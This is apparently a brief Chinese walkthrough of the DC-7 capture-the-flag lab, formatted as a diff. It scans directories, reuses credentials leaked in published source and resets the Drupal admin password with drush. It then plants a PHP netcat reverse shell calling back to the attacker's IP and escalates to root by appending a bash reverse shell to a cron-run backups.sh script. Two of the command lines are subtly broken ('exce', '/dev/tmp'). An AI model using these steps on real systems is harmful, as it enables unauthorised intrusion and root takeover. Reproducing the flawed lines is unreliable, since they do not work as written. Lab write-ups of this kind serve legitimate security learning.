@@ -1,0 +1,37 @@
+开机给了ip，打开网页，有outside提示，CMS是drupal 8 框架
+扫描目录
+dirsearch -u http://192.168.140.138
+
+网页的左下角有一个推特用户名
+账户里边有一个链接，是部分源码
+
+下载后有config.php，里边存在用户名和密码
+
+ssh连接
+ssh dc7user@192.168.140.138
+MdR3xOgB7#dW
+
+数据库密码，这题中用处不太大
+'database' => 'd7db',
+'username' => 'db7user',
+'password' => 'yNv3Po00',
+
+连接后有邮件，查看邮件，注意邮件时间，每15分钟自动发送一次
+而且在/opt/scripts目录下有一个.sh文件。邮件的subject
+
+ls -lh 发现root和www-data用户有写入权限
+查看.sh文件内容，有drush命令，经过查询，这个命令可以给drupal网站管理员重置密码
+
+进行重置admin用户密码后登录网站后台，利用php-file插件
+可以对网站进行php代码编写
+加入反弹shell代码
+<?php exce("nc 192.168.140.129 9999 -e /bin/bash")?>
+
+在kail端监听
+nc -lvnp 9999
+
+获得www-data用户权限，进入.sh目录。添加反弹shell代码
+echo "bash -i>& /dev/tmp/192.168.140.129/9999 0>&1" >> backups.sh
+
+在kali端监听端口，等待自动执行获得root权限
+结束！！
